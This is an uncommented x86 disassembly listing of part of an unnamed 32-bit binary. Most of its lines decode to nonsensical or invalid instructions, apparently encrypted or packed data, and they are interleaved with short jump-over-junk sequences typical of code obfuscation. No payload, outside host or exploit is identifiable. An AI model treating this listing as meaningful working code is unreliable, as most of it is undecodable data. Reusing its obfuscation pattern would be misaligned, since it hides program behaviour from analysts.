  41ebc7:	daa    
  41ebc8:	daa    
  41ebc9:	pop    ebx
  41ebca:	mov    cl,al
  41ebcc:	and    BYTE PTR [edi],ah
  41ebce:	arpl   WORD PTR [esi],ax
  41ebd0:	push   0xdef71d58
  41ebd5:	dec    ebx
  41ebd6:	mov    al,0x5
  41ebd8:	xlat   BYTE PTR gs:[ebx]
  41ebda:	adc    ebp,DWORD PTR [esi+0x3]
  41ebdd:	jns    0x41eb7c
  41ebdf:	mov    dh,0xfe
  41ebe1:	add    eax,ebx
  41ebe3:	into   
  41ebe4:	outs   dx,BYTE PTR ds:[esi]
  41ebe5:	pop    ds
  41ebe6:	pop    es
  41ebe7:	add    eax,0x58293362
  41ebec:	xchg   ecx,eax
  41ebed:	pop    eax
  41ebee:	sbb    al,0x45
  41ebf0:	pusha  
  41ebf1:	xor    eax,0x975e3174
  41ebf6:	xchg   edx,eax
  41ebf7:	repz mov ah,0xfd
  41ebfa:	jne    0x41ec3b
  41ebfc:	xor    al,0xc1
  41ebfe:	popa   
  41ebff:	xor    eax,0xbc85bb9b
  41ec04:	mov    edi,0x2408413f
  41ec09:	stc    
  41ec0a:	js     0x41ec6a
  41ec0c:	test   esp,esi
  41ec0e:	jecxz  0x41ec2c
  41ec10:	cmp    ebp,DWORD PTR [ebx+0x1e30a91e]
  41ec16:	out    0xc2,al
  41ec18:	sbb    eax,0xd36d13bf
  41ec1d:	push   esp
  41ec1e:	cvtdq2ps xmm5,XMMWORD PTR [esp+ebx*8-0x9]
  41ec23:	push   ss
  41ec24:	mov    ecx,0x641b67f9
  41ec29:	dec    edi
  41ec2a:	jmp    0x41ebd8
  41ec2c:	dec    ebx
  41ec2d:	sar    BYTE PTR [edi],0xf5
  41ec30:	add    dh,bh
  41ec32:	sbb    BYTE PTR [eax],al
  41ec34:	repz jno 0x41ebd3
  41ec37:	enter  0x5448,0x4
  41ec3b:	sub    DWORD PTR [edi+eax*8-0x25bd1bbb],edi
  41ec42:	jmp    0x41ec90
  41ec44:	mov    ebx,0x399e
  41ec49:	mov    ebx,0x3cf87511
  41ec4e:	cmp    eax,edx
  41ec50:	mov    DWORD PTR ds:0x4335cc,0x579
  41ec5a:	jne    0x41ec73
  41ec60:	movzx  eax,WORD PTR ds:0x43364c
  41ec67:	mov    eax,DWORD PTR [ebp-0x34]
  41ec6a:	cmp    DWORD PTR [ebp-0x24],eax
  41ec6d:	je     0x420b89
  41ec73:	mov    eax,DWORD PTR [ebp-0x3c]
  41ec76:	inc    DWORD PTR ds:0x433658
  41ec7c:	jmp    0x41ed4a
  41ec81:	mov    WORD PTR [esi],es
  41ec83:	or     eax,0xdd5b8f58
  41ec88:	(bad)  
  41ec89:	fimul  DWORD PTR [ecx-0x40]
  41ec8c:	pop    edi
  41ec8d:	sbb    edi,ebp
  41ec8f:	mov    ecx,0x1673f70
  41ec94:	add    BYTE PTR [ecx-0x6c000000],dh
  41ec9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec9b:	mov    DWORD PTR [esi-0x44414c14],edi
  41eca1:	jecxz  0x41ecbc
  41eca3:	mov    BYTE PTR ds:0x1d26e0fc,bl
  41eca9:	push   0xffffffed
  41ecab:	sub    eax,0xd326a21f
  41ecb0:	inc    edx
  41ecb1:	jae    0x41ecfa
  41ecb3:	aam    0x1e
  41ecb5:	aam    0x2
  41ecb7:	sub    ecx,0x1934c354
  41ecbd:	adc    BYTE PTR [edx-0x2eddbe05],ch
  41ecc3:	fimul  DWORD PTR [ebx]
  41ecc5:	or     BYTE PTR [esi+0x45da5b67],0x7d
  41eccc:	inc    edi
  41eccd:	xor    al,ah
  41eccf:	stc    
  41ecd0:	aam    0xb5
  41ecd2:	inc    esi
  41ecd3:	stos   BYTE PTR es:[edi],al
  41ecd4:	out    0x17,al
  41ecd6:	mov    edx,esp
  41ecd8:	shr    DWORD PTR [edi-0x3],cl
  41ecdb:	push   cs
  41ecdc:	mov    bh,0x2d
  41ecde:	xor    esi,DWORD PTR [edx+edx*1-0x3d]
  41ece2:	pushf  
  41ece3:	mov    ds:0xc15dcb58,eax
  41ece8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ece9:	mov    ch,0x6f
  41eceb:	jmp    0xd5ae:0x68bbacd6
  41ecf2:	push   0x6a
  41ecf4:	xor    eax,0xe2c6319
  41ecf9:	fnstcw WORD PTR [ebp-0xa]
  41ecfc:	cmp    ebx,esi
  41ecfe:	sar    DWORD PTR [edx+ebp*4],cl
  41ed01:	push   esp
  41ed02:	daa    
  41ed03:	hlt    
  41ed04:	test   DWORD PTR [ebp-0x54],edi
  41ed07:	(bad)  
  41ed08:	icebp  
  41ed09:	call   0x499e:0x8cb70328
  41ed10:	add    BYTE PTR [ebp+ebx*8-0x1fd75bc4],ch
  41ed17:	sub    eax,0x725ea615
  41ed1c:	pop    es
  41ed1d:	es out 0x12,al
  41ed20:	fild   QWORD PTR ds:[eax+0x7a292b86]
  41ed27:	out    0xc5,al
  41ed29:	mov    esi,0x511c48fd
  41ed2e:	jge    0x41ecf0
  41ed30:	sub    al,0x8e
  41ed32:	mov    ecx,0xc5d57e31
  41ed37:	adc    dh,dl
  41ed39:	lds    edx,FWORD PTR [ebx+edx*8-0x40]
  41ed3d:	jmp    0x86532799
  41ed42:	test   al,0x7f
  41ed44:	ret    
  41ed45:	loop   0x41ed75
  41ed47:	dec    edx
  41ed48:	fstp   QWORD PTR [edi+0x33]
  41ed4b:	shr    cl,cl
  41ed4d:	leave  
  41ed4e:	add    BYTE PTR [eax],al
  41ed50:	add    al,ch
  41ed52:	pop    esp
  41ed53:	pop    es
  41ed54:	ins    DWORD PTR es:[edi],dx
  41ed55:	mov    bh,0x7f
  41ed57:	jmp    0xd795:0x60c6abdd
  41ed5e:	push   es
  41ed5f:	mov    ch,0x95
  41ed61:	lock add DWORD PTR [bx+si],eax
  41ed65:	mov    cl,0x0
  41ed67:	add    BYTE PTR [eax],al
  41ed69:	mov    ebp,0x3142b923
  41ed6e:	retf   0x9079
  41ed71:	xlat   BYTE PTR ds:[ebx]
  41ed72:	xchg   esp,eax
  41ed73:	cli    
  41ed74:	mov    cl,0xb3
  41ed76:	iret   
  41ed77:	jle    0x41edd4
  41ed79:	sub    dh,BYTE PTR [edi+0x647f01d8]
  41ed7f:	cmp    DWORD PTR [ecx+0x79],edi
  41ed82:	arpl   WORD PTR [esi],bx
  41ed84:	xlat   BYTE PTR ds:[ebx]
  41ed85:	cdq    
  41ed86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed87:	push   es
  41ed88:	mov    esi,DWORD PTR [ebx]
  41ed8a:	mov    ch,0xab
  41ed8c:	stos   BYTE PTR es:[edi],al
  41ed8d:	sar    ah,1
  41ed8f:	stc    
  41ed90:	out    0x4f,al
  41ed92:	sbb    BYTE PTR [edi-0x5e],dl
  41ed95:	jae    0x41edf7
  41ed97:	xor    eax,0x42c9c78
  41ed9c:	sti    
  41ed9d:	fisubr WORD PTR [ebx]
  41ed9f:	jmp    0x69f8a2f1
  41eda4:	inc    edx
  41eda5:	pusha  
  41eda6:	outs   dx,BYTE PTR ds:[esi]
  41eda7:	add    eax,0x6babd309
  41edac:	inc    esi
  41edad:	(bad)  [ebp-0x3e2fdb0e]
  41edb3:	pop    eax
  41edb4:	jecxz  0x41edb8
  41edb6:	push   0x4b852c87
  41edbb:	xchg   BYTE PTR [ebx-0x2255b458],bl
  41edc1:	adc    bl,BYTE PTR [esi+ebp*4+0x77dfbcf7]
  41edc8:	test   eax,0xfe3b00a0
  41edcd:	and    eax,ecx
  41edcf:	nop
  41edd0:	scas   eax,DWORD PTR es:[edi]
  41edd1:	and    al,0x45
  41edd3:	dec    edx
  41edd4:	cmp    DWORD PTR [ebx],ebx
  41edd6:	in     eax,0x75
  41edd8:	out    dx,al
  41edd9:	test   DWORD PTR [ecx-0x741a5626],edx
  41eddf:	sbb    ecx,ecx
  41ede1:	cmp    bl,BYTE PTR [edi]
  41ede3:	mov    al,0x4b
  41ede5:	xor    eax,0xb8adc0c
  41edea:	fimul  DWORD PTR [eax+0x4b]
  41eded:	cdq    
  41edee:	lock sbb BYTE PTR ds:0x4522b754,bl
  41edf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edf6:	mov    ecx,0x2003bb5b
  41edfb:	jp     0x41ee29
  41edfd:	xchg   ebp,eax
  41edfe:	ficom  DWORD PTR [edi-0x67ec7b3]
  41ee04:	mov    edi,DWORD PTR [edx]
  41ee06:	mov    edx,0xa0bb2a84
  41ee0b:	pop    ebx
  41ee0c:	push   cs
  41ee0d:	mov    al,0xa4
  41ee0f:	les    eax,FWORD PTR [esi+0x6dd844f0]
  41ee15:	push   0xcbd44128
  41ee1a:	add    eax,edi
  41ee1c:	mov    DWORD PTR ds:0x4335a0,0x6f19
  41ee26:	adc    edx,0xffff7223
  41ee2c:	xor    DWORD PTR ds:0x433648,0xf95
  41ee36:	jmp    0x41ef04
  41ee3b:	je     0x41eea0
  41ee3d:	adc    edx,DWORD PTR [edx-0x180a0de9]
  41ee43:	out    dx,eax
  41ee44:	mov    esi,0x2dd970a5
  41ee49:	jns    0x41eebb
  41ee4b:	mov    eax,ds:0xb1000168
  41ee50:	add    BYTE PTR [eax],al
  41ee52:	add    BYTE PTR [esi-0x67897ba1],bh
  41ee58:	clc    
  41ee59:	sbb    edi,DWORD PTR [ecx-0x28a87eca]
  41ee5f:	adc    BYTE PTR [esi],cl
  41ee61:	sub    al,0xb0
  41ee63:	push   es
  41ee64:	data16 adc al,0x30
  41ee67:	add    BYTE PTR [esp+ebp*1+0x41],dl
  41ee6b:	add    ebp,DWORD PTR [eax+ecx*8]
  41ee6e:	loop   0x41edf1
  41ee70:	es into 
  41ee72:	jmp    DWORD PTR [eax]
  41ee74:	bound  edi,QWORD PTR [esi]
  41ee76:	xchg   BYTE PTR [ebx],ah
  41ee78:	leave  
  41ee79:	mov    eax,0xfde6873
  41ee7e:	in     eax,dx
  41ee7f:	loope  0x41eee1
  41ee81:	popf   
  41ee82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee83:	out    0x54,eax
  41ee85:	test   al,0x53
  41ee87:	clc    
  41ee88:	or     eax,0x29c7a88b
  41ee8d:	adc    BYTE PTR [esi+edi*2-0x79],0xd5
  41ee92:	lock xor WORD PTR [edi+0x15],di
  41ee97:	add    BYTE PTR [edi-0x6fe1ac70],ch
  41ee9d:	mov    eax,ds:0x4bb5b234
  41eea2:	repnz neg al
  41eea5:	scas   al,BYTE PTR es:[edi]
  41eea6:	cmp    eax,0xab55418a
  41eeab:	jbe    0x41ee64
  41eead:	xchg   edx,eax
  41eeae:	fld    QWORD PTR [ebx-0x74]
  41eeb1:	or     ebx,edi
  41eeb3:	mov    ebp,0xe7911a0b
  41eeb8:	jo     0x41ee9a
  41eeba:	test   DWORD PTR [esi+0xd],0xca8487a7
  41eec1:	mov    eax,ebx
  41eec3:	pop    edx
  41eec4:	adc    BYTE PTR [ebp+0x2],0xd2
  41eec8:	xchg   edi,eax
  41eec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eeca:	pop    ebx
  41eecb:	ja     0x41ef12
  41eecd:	rcl    BYTE PTR [esi-0x3a38cf57],0x8f
  41eed4:	arpl   WORD PTR [ecx+0x4f8c720e],di
  41eeda:	push   cs
  41eedb:	loop   0x41eee7
  41eedd:	inc    esp
  41eede:	jge    0x41eec8
  41eee0:	mov    esi,0xa0957375
  41eee5:	adc    eax,0xbc5f6e8c
  41eeea:	and    eax,0x4da8668a
  41eeef:	idiv   BYTE PTR [eax-0x7e]
  41eef2:	or     DWORD PTR [ecx+0x7f],0x577b789
  41eef9:	arpl   bx,si
  41eefb:	push   esp
  41eefc:	lods   eax,DWORD PTR ds:[esi]
  41eefd:	mov    ch,0x64
  41eeff:	mov    dl,0x92
  41ef01:	sbb    edi,DWORD PTR [ebx+edi*2]
  41ef04:	xor    edx,ecx
  41ef06:	adc    ecx,DWORD PTR ds:0x433564
  41ef0c:	jmp    0x41efda
  41ef11:	mov    WORD PTR [esi-0x15911594],es
  41ef17:	mov    fs,esi
  41ef19:	retf   0x582f
  41ef1c:	fidivr WORD PTR [edi+0x39]
  41ef1f:	bound  edi,QWORD PTR [ecx]
  41ef21:	push   edx
  41ef22:	imul   eax,DWORD PTR [ecx],0xb100
  41ef28:	add    BYTE PTR [edi],ch
  41ef2a:	pop    es
  41ef2b:	xor    DWORD PTR [eax+0x13df4c55],eax
  41ef31:	mov    dh,0x90
  41ef33:	fbld   TBYTE PTR [edx+0x606ca876]
  41ef39:	sbb    ebx,DWORD PTR [ebx-0x12]
  41ef3c:	dec    ebx
  41ef3d:	add    cl,cl
  41ef3f:	mov    BYTE PTR [ebx-0x1d],ch
  41ef42:	out    0x93,al
  41ef44:	pop    ecx
  41ef45:	jmp    0x1749905d
  41ef4a:	and    eax,0x326acb3c
  41ef4f:	es pop es
  41ef51:	loopne 0x41ef74
  41ef53:	in     eax,dx
  41ef54:	fisttp DWORD PTR [edi]
  41ef56:	(bad)  [ecx]
  41ef58:	std    
  41ef59:	pop    edx
  41ef5a:	or     cl,BYTE PTR [ecx+0x52]
  41ef5d:	test   eax,0x70968725
  41ef62:	popa   
  41ef63:	and    DWORD PTR [edi-0x12],edx
  41ef66:	fdiv   DWORD PTR [ebp-0x13b79a13]
  41ef6c:	(bad)  
  41ef6d:	mov    WORD PTR [eax-0x5de31d4a],?
  41ef73:	sbb    al,BYTE PTR [eax-0x5a]
  41ef76:	fild   WORD PTR [ecx+0x15]
  41ef79:	cmp    DWORD PTR [edi-0x5627b52a],0x39
  41ef80:	mov    eax,0x77c6b1a2
  41ef85:	dec    edx
  41ef86:	inc    ecx
  41ef87:	minps  xmm7,XMMWORD PTR [ebp+eax*2-0x287ef258]
  41ef8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef90:	dec    edx
  41ef91:	sbb    DWORD PTR [ebp+0x5b],ebp
  41ef94:	push   eax
  41ef95:	or     DWORD PTR [edx+edx*2],edi
  41ef98:	fwait
  41ef99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef9a:	jno    0x41efcf
  41ef9c:	xor    bh,ah
  41ef9e:	adc    BYTE PTR [esp],cl
  41efa1:	loop   0x41f022
  41efa3:	call   0xa224:0x949b68fe
  41efaa:	mov    bl,0x2b
  41efac:	mov    dl,0x6
  41efae:	or     al,0x3d
  41efb0:	mov    eax,ds:0x8c15d14a
  41efb5:	fs lods eax,DWORD PTR fs:[esi]
  41efb8:	mov    cl,BYTE PTR [ebx+eax*8+0x23]
  41efbc:	dec    edi
  41efbd:	div    eax
  41efbf:	cmp    edx,0x3f
  41efc2:	push   eax
  41efc3:	sub    DWORD PTR [esi],esp
  41efc5:	mov    ds:0x3e779c77,al
  41efca:	js     0x41eff0
  41efcc:	cmp    al,0xdf
  41efce:	mov    dl,0x50
  41efd0:	xchg   ecx,eax
  41efd1:	mov    al,0x59
  41efd3:	cmp    eax,0xc4c5b253
  41efd8:	iret   
  41efd9:	sahf   
  41efda:	mov    ecx,DWORD PTR [ebp+0x8]
  41efdd:	and    DWORD PTR ds:0x4335b0,0x4335c4
  41efe7:	mov    DWORD PTR [ebp-0x38],ecx
  41efea:	or     ecx,0x6e74
  41eff0:	jmp    0x41f0be
  41eff5:	xchg   edx,eax
  41eff6:	or     DWORD PTR [ebp-0x4d42605b],edx
  41effc:	aas    
  41effd:	adc    esp,ecx
  41efff:	jnp    0x41efa6
  41f001:	xlat   BYTE PTR ds:[ebx]
  41f002:	add    BYTE PTR [eax+0x16a03a1],ah
  41f008:	add    BYTE PTR [ecx-0x74000000],dh
  41f00e:	stos   BYTE PTR es:[edi],al
  41f00f:	jge    0x41f000
  41f011:	ret    0x5c37
  41f014:	mov    esi,0xd13615fb
  41f019:	arpl   WORD PTR [edx],dx
  41f01b:	push   ss
  41f01c:	imul   eax,eax,0x53
  41f01f:	xchg   edi,eax
  41f020:	inc    ebx
  41f021:	sbb    ebx,DWORD PTR [ebx-0x613ff136]
  41f027:	jmp    0xc6f5d010
  41f02c:	lods   eax,DWORD PTR ds:[esi]
  41f02d:	add    al,0xab
  41f02f:	cwde   
  41f030:	arpl   WORD PTR [edx],bp
  41f032:	add    eax,0xdc121ef7
  41f037:	cmp    edi,DWORD PTR [ecx]
  41f039:	int    0x32
  41f03b:	lock push eax
  41f03d:	pusha  
  41f03e:	lock pop esp
  41f040:	or     DWORD PTR [ebx],ebx
  41f042:	je     0x41f0bb
  41f044:	mov    edi,0x996e4ffb
  41f049:	jl     0x41f020
  41f04b:	cli    
  41f04c:	mov    bh,dl
  41f04e:	jne    0x41f0a2
  41f050:	ss mov edi,0x4583deab
  41f056:	jle    0x41f02d
  41f058:	cmp    eax,0x297abcd8
  41f05e:	das    
  41f05f:	aas    
  41f060:	ds es js 0x41f0cc
  41f064:	(bad)  
  41f065:	pop    esp
  41f066:	jb     0x41f067
  41f068:	cmp    DWORD PTR [eax-0x56],esp
  41f06b:	aad    0xec
  41f06d:	mov    esi,0x35fd715d
  41f072:	xchg   edi,eax
  41f073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f074:	mov    al,ds:0xff80b045
  41f079:	icebp  
  41f07a:	xchg   edi,eax
  41f07b:	xor    ah,BYTE PTR [eax]
  41f07d:	repz jo 0x41f0d2
  41f080:	xlat   BYTE PTR ds:[ebx]
  41f081:	ins    DWORD PTR es:[edi],dx
  41f082:	loope  0x41f06e
  41f084:	mov    ch,0xfa
  41f086:	add    BYTE PTR [ebx-0x611132f],dl
  41f08c:	jge    0x41f02a
  41f08e:	test   al,0x25
  41f090:	sub    al,0x92
  41f092:	sbb    cl,BYTE PTR [ebp-0x1c1c6be9]
  41f098:	add    ecx,DWORD PTR [esp+ecx*4+0x48]
  41f09c:	xchg   ebx,eax
  41f09d:	pushf  
  41f09e:	xchg   esi,eax
  41f09f:	mov    dh,0xb9
  41f0a1:	pop    ecx
  41f0a2:	in     al,0xf7
  41f0a4:	push   es
  41f0a5:	jecxz  0x41f07a
  41f0a7:	out    dx,al
  41f0a8:	pop    ebx
  41f0a9:	sub    ecx,DWORD PTR [ebp-0xb12b427]
  41f0af:	and    eax,0x24d19a61
  41f0b4:	xchg   ecx,eax
  41f0b5:	stos   BYTE PTR es:[edi],al
  41f0b6:	repnz ficom DWORD PTR [edi]
  41f0b9:	push   esp
  41f0ba:	xchg   DWORD PTR [edx+0x4d8b5725],esp
  41f0c0:	or     al,0xc7
  41f0c2:	add    eax,0x4335c8
  41f0c7:	iret   
  41f0c8:	inc    ecx
  41f0c9:	add    BYTE PTR [eax],al
  41f0cb:	xor    eax,esi
  41f0cd:	mov    DWORD PTR ds:0x433550,0x703d
  41f0d7:	jmp    0x41f1a5
  41f0dc:	xchg   esp,eax
  41f0dd:	sub    dh,BYTE PTR gs:[eax-0x5]
  41f0e1:	jg     0x41f0c1
  41f0e3:	in     eax,0x7f
  41f0e5:	add    dh,BYTE PTR [edx-0x5f]
  41f0e8:	leave  
  41f0e9:	and    al,0x77
  41f0eb:	jo     0x41f0a1
  41f0ed:	push   0x1
  41f0ef:	add    BYTE PTR [ecx-0x1000000],dh
  41f0f5:	scas   eax,DWORD PTR es:[edi]
  41f0f6:	dec    ebx
  41f0f7:	and    ebp,ecx
  41f0f9:	mov    ebp,0x5f88080f
  41f0fe:	aaa    
  41f0ff:	stos   BYTE PTR es:[edi],al
  41f100:	test   dh,0xfe
  41f103:	imul   eax,DWORD PTR ds:0x77e7c5fb,0x491a9025
  41f10d:	out    0x61,eax
  41f10f:	push   esi
  41f110:	xor    ah,ch
  41f112:	xchg   esp,eax
  41f113:	inc    esp
  41f114:	lds    esp,FWORD PTR [ebx]
  41f116:	mov    ebx,0x2226879e
  41f11b:	out    dx,eax
  41f11c:	cmp    DWORD PTR [esi],edx
  41f11e:	xchg   esp,eax
  41f11f:	test   BYTE PTR [ecx-0x4e],0xaa
  41f123:	jnp    0x41f0a9
  41f125:	mov    esi,0xd254b9f9
  41f12a:	std    
  41f12b:	mov    ah,BYTE PTR [ebx-0x351a0f78]
  41f131:	cs mov ah,al
  41f134:	jae    0x41f15c
  41f136:	cmp    eax,0x459e2447
  41f13b:	(bad)  
  41f13c:	fwait
  41f13d:	sbb    al,0x7f
  41f13f:	loopne 0x41f147
  41f141:	dec    esi
  41f142:	push   ebp
  41f143:	add    al,BYTE PTR [esi]
  41f145:	sahf   
  41f146:	data16 jne 0x41f1c4
  41f149:	repnz outs dx,DWORD PTR ds:[esi]
  41f14b:	push   eax
  41f14c:	retf   
  41f14d:	call   0x974aa189
  41f152:	push   edx
  41f153:	sahf   
  41f154:	fst    QWORD PTR [edi+esi*4+0x48]
  41f158:	xchg   esp,eax
  41f159:	jb     0x41f0fa
  41f15b:	dec    edx
  41f15c:	mul    BYTE PTR [ebx-0x25]
  41f15f:	cmp    esp,DWORD PTR [ecx-0xac53957]
  41f165:	push   ecx
  41f166:	dec    ecx
  41f167:	adc    eax,0x554882a4
  41f16c:	sub    ch,BYTE PTR [ecx-0x165be8c2]
  41f172:	addr16 pop ds
  41f174:	or     DWORD PTR [edx],0x3aa8d0ee
  41f17a:	repnz hlt 
  41f17c:	push   0xffffffd6
  41f17e:	add    al,0xb6
  41f180:	push   esp
  41f181:	mov    esi,0x83fbd69c
  41f186:	aad    0xd8
  41f188:	xchg   esi,eax
  41f189:	sbb    al,0x1f
  41f18b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f18c:	enter  0xef8c,0x8d
  41f190:	repnz or DWORD PTR [edx+ebp*4-0x71],esi
  41f195:	pop    ebp
  41f196:	mov    eax,0x78a4ddd2
  41f19b:	cmp    DWORD PTR [edi-0x36],edx
  41f19e:	add    al,0xf
  41f1a0:	sub    esp,ecx
  41f1a2:	loope  0x41f150
  41f1a4:	jae    0x41f12f
  41f1a6:	dec    ebp
  41f1a7:	int3   
  41f1a8:	mov    DWORD PTR ds:0x433660,0x2387
  41f1b2:	cmp    eax,DWORD PTR [ebp-0x38]
  41f1b5:	mov    DWORD PTR ds:0x433590,0xa29
  41f1bf:	jmp    0x41f28d
  41f1c4:	and    eax,0xd5fbc5f4
  41f1c9:	sti    
  41f1ca:	aas    
  41f1cb:	(bad)  
  41f1cc:	cmc    
  41f1cd:	cld    
  41f1ce:	call   0x3982dfef
  41f1d3:	mov    edi,0x16b65
  41f1d8:	mov    cl,0x0
  41f1da:	add    BYTE PTR [eax],al
  41f1dc:	xor    al,bh
  41f1de:	xor    esi,DWORD PTR [edx-0x42]
  41f1e1:	or     edi,edi
  41f1e3:	dec    ebp
  41f1e4:	or     eax,0xabba7c63
  41f1e9:	sbb    al,0xaa
  41f1eb:	fmul   DWORD PTR [ebx+0x7853fe41]
  41f1f1:	sbb    eax,0x3f925fc5
  41f1f6:	nop
  41f1f7:	dec    edi
  41f1f8:	push   es
  41f1f9:	popa   
  41f1fa:	sub    BYTE PTR [edi-0x8],ch
  41f1fd:	icebp  
  41f1fe:	leave  
  41f1ff:	or     ebx,ecx
  41f201:	sbb    BYTE PTR [ebx-0x5c2bf287],ah
  41f207:	xchg   esi,ebp
  41f209:	pop    esp
  41f20a:	sub    esi,DWORD PTR [esi]
  41f20c:	xor    cl,BYTE PTR [eax-0x271adba6]
  41f212:	sbb    dl,bl
  41f214:	mov    ch,0xcc
  41f216:	inc    ecx
  41f217:	add    bh,al
  41f219:	popa   
  41f21a:	test   al,0xc3
  41f21c:	adc    bh,BYTE PTR [ecx]
  41f21e:	jp     0x41f21e
  41f220:	adc    ah,BYTE PTR ds:0x95022961
  41f226:	pop    edi
  41f227:	popf   
  41f228:	inc    eax
  41f229:	test   eax,eax
  41f22b:	dec    ebx
  41f22c:	bound  eax,QWORD PTR [ecx-0x6a]
  41f22f:	dec    ecx
  41f230:	addr16 mov ecx,0x6f7a5f76
  41f236:	repnz sub ebx,eax
  41f239:	jge    0x41f224
  41f23b:	iret   
  41f23c:	stc    
  41f23d:	imul   ch
  41f23f:	lock and dh,BYTE PTR [ebx+0x4b]
  41f243:	jp     0x41f1d7
  41f245:	out    0xf3,eax
  41f247:	lods   al,BYTE PTR ds:[esi]
  41f248:	out    0x3e,eax
  41f24a:	ja     0x41f25d
  41f24c:	dec    ebx
  41f24d:	addr16 out 0x2f,eax
  41f250:	repnz clc 
  41f252:	fwait
  41f253:	mov    ah,0x7f
  41f255:	inc    esp
  41f256:	cld    
  41f257:	clc    
  41f258:	rol    DWORD PTR [ebp-0x67],1
  41f25b:	sub    ebx,edi
  41f25d:	sbb    ebp,DWORD PTR fs:[ecx+0x6f]
  41f261:	loopne 0x41f263
  41f263:	and    BYTE PTR [eax],cl
  41f265:	sahf   
  41f266:	jo     0x41f2e2
  41f268:	adc    bl,BYTE PTR [esi+0x34]
  41f26b:	stos   DWORD PTR es:[edi],eax
  41f26c:	pop    edi
  41f26d:	ss jp  0x41f2a5
  41f270:	ret    0xee2e
  41f273:	popa   
  41f274:	jle    0x41f209
  41f276:	cmp    eax,0x6a5af2a4
  41f27b:	pop    eax
  41f27c:	std    
  41f27d:	xchg   ebx,eax
  41f27e:	hlt    
  41f27f:	ja     0x41f2fb
  41f281:	pushf  
  41f282:	dec    ebp
  41f283:	ja     0x41f296
  41f285:	imul   eax,DWORD PTR [ebp-0x6ad57ed8],0x850fe22e
  41f28f:	sbb    al,0x0
  41f291:	add    BYTE PTR [eax],al
  41f293:	mov    DWORD PTR ds:0x4335e0,0x2911
  41f29d:	cmp    edx,ecx
  41f29f:	mov    DWORD PTR ds:0x433544,0x33dc
  41f2a9:	je     0x420b89
  41f2af:	cmp    DWORD PTR ds:0x4335c4,0x0
  41f2b6:	jb     0x41f3ac
  41f2bc:	add    edx,ecx
  41f2be:	jmp    0x41f3ac
  41f2c3:	push   DWORD PTR [ebp-0x28]
  41f2c6:	push   0x4dc8
  41f2cb:	push   0x7d46
  41f2d0:	push   0x365d
  41f2d5:	push   DWORD PTR [ebp-0x24]
  41f2d8:	call   DWORD PTR ds:0x43c7f4
  41f2de:	jmp    0x41f3ac
  41f2e3:	arpl   ax,dx
  41f2e5:	xchg   esp,eax
  41f2e6:	push   ecx
  41f2e7:	mov    bh,0x55
  41f2e9:	out    0xf2,eax
  41f2eb:	hlt    
  41f2ec:	mov    cl,0xa9
  41f2ee:	aas    
  41f2ef:	sub    dl,BYTE PTR [esi]
  41f2f1:	adc    DWORD PTR [edi+0x16c16],ecx
  41f2f7:	mov    cl,0x0
  41f2f9:	add    BYTE PTR [eax],al
  41f2fb:	mov    cl,0xf6
  41f2fd:	loop   0x41f2ca
  41f2ff:	js     0x41f2b3
  41f301:	sti    
  41f302:	pop    eax
  41f303:	dec    ebp
  41f304:	int3   
  41f305:	mov    eax,ds:0xe0752854
  41f30a:	call   0xcae6:0xf50fb232
  41f311:	dec    edi
  41f312:	or     ebx,DWORD PTR [ebp+0x1145a955]
  41f318:	jns    0x41f2de
  41f31a:	adc    ch,0xaf
  41f31d:	fidivr WORD PTR [eax-0x33]
  41f320:	les    edi,FWORD PTR es:[edx-0x36a621c2]
  41f327:	jb     0x41f3a7
  41f329:	xor    al,0xa4
  41f32b:	xchg   ebp,eax
  41f32c:	shl    DWORD PTR [ebp+0x795401d6],1
  41f332:	repz fnsave [eax+0x5e95e9a8]
  41f339:	cdq    
  41f33a:	scas   eax,DWORD PTR es:[edi]
  41f33b:	jmp    0x5855eb2f
  41f340:	leave  
  41f341:	gs inc ecx
  41f343:	cdq    
  41f344:	(bad)  
  41f345:	sbb    BYTE PTR [eax],bh
  41f347:	xor    edi,DWORD PTR [esi+0x13]
  41f34a:	sub    DWORD PTR [ebx-0x64],edi
  41f34d:	(bad)  
  41f34e:	mov    cl,0xfb
  41f350:	jecxz  0x41f35d
  41f352:	fnstcw WORD PTR ds:0xed4216ec
  41f358:	jb     0x41f333
  41f35a:	jno    0x41f314
  41f35c:	ja     0x41f341
  41f35e:	mov    ch,0x61
  41f360:	push   0xb2dcf864
  41f365:	fdivr  DWORD PTR [ecx+ebx*4-0x30]
  41f369:	neg    BYTE PTR [ebx]
  41f36b:	and    ch,cl
  41f36d:	icebp  
  41f36e:	pop    eax
  41f36f:	test   BYTE PTR [ecx-0x3f],bl
  41f372:	mov    eax,ds:0x31cdac41
  41f377:	xlat   BYTE PTR ds:[ebx]
  41f378:	out    dx,eax
  41f379:	or     esi,DWORD PTR [edi+esi*4+0x5a3732a3]
  41f380:	test   eax,0xcabd0550
  41f385:	stos   BYTE PTR es:[edi],al
  41f386:	jle    0x41f345
  41f388:	adc    DWORD PTR [eax],ebx
  41f38a:	or     BYTE PTR [edx],0xf6
  41f38d:	jne    0x41f359
  41f38f:	leave  
  41f390:	imul   BYTE PTR gs:[edi-0x68]
  41f394:	call   0xe1eb:0x930ebbb7
  41f39b:	mov    ebx,DWORD PTR [ebx]
  41f39d:	and    eax,0x389bbdd7
  41f3a2:	add    al,0xa5
  41f3a4:	fnstcw WORD PTR [edx]
  41f3a6:	add    eax,0x49680662
  41f3ab:	loope  0x41f338
  41f3ad:	inc    ebp
  41f3ae:	in     al,0x8b
  41f3b0:	dec    ebp
  41f3b1:	in     al,0x2b
  41f3b3:	retf   
  41f3b4:	sub    eax,0x7511
  41f3b9:	xor    ecx,0x78e20000
  41f3bf:	shr    ecx,0x10
  41f3c2:	or     DWORD PTR ds:0x433544,0x344
  41f3cc:	xor    eax,0x59c9
  41f3d1:	shl    eax,0x10
  41f3d4:	mov    edx,DWORD PTR ds:0x43365c
  41f3da:	and    DWORD PTR ds:0x433584,edx
  41f3e0:	or     eax,ecx
